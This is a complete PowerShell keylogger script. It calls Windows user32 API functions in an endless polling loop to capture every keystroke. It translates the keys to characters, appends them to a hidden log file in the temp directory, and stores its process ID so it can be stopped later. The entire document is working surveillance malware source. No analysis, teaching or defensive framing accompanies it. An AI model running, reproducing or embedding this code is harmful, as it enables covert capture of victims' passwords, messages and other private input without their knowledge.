function Keystrokes()
{
   [int]$totalNumber = 0
   $Path = "$Env:TMP\keys.log"
   echo $pid > $Env:TMP\pid.log #Store Process PID to be abble to stop it later


#API Calls
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

   #Load signatures and make members available
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
 
   #Create output file
   $null = New-Item -Path $Path -ItemType File -Force

   try{
      Write-Host "* " -ForegroundColor Green -NoNewline;
      Write-Host "Keylogger is working with ID: " -ForegroundColor DarkGray -NoNewline;
      Write-Host "$pid" -ForegroundColor Green
      Write-Host "  => Press CTRL+C to stop process .." -ForegroundColor DarkYellow

      ## Create endless loop
      # collect pressed keys, CTRL+C to exit
      While($true)
      {
         Start-Sleep -Milliseconds 20
         #Scan  ASCII codes between 8 and 129
         For($ascii = 9; $ascii -le 128; $ascii++) 
         {
            #Get current key state
            $state = $API::GetAsyncKeyState($ascii)
            #Is key pressed?
            If($state -eq -32767) 
            {
               $null = [console]::CapsLock

               #Translate scan code to real code
               $virtualKey = $API::MapVirtualKey($ascii, 3)

               #Get keyboard state for virtual keys
               $kbstate = New-Object Byte[] 256
               $checkkbstate = $API::GetKeyboardState($kbstate)

               #Prepare a StringBuilder to receive input key
               $mychar = New-Object -TypeName System.Text.StringBuilder

               #Translate virtual key
               $qsuccess = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                 If($qsuccess) 
                 {
                    #add key to logger file
                    [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                    $totalNumber = $totalNumber+1
                 }
              }
          }
       }
   }
   finally
   {
      write-Host "* " -ForegroundColor Green -NoNewline;
      write-Host "Total Number of Keystrokes: " -ForegroundColor DarkGray -NoNewline;
      write-Host "$totalNumber" -ForegroundColor Green 
      write-host "$Path"
   }
}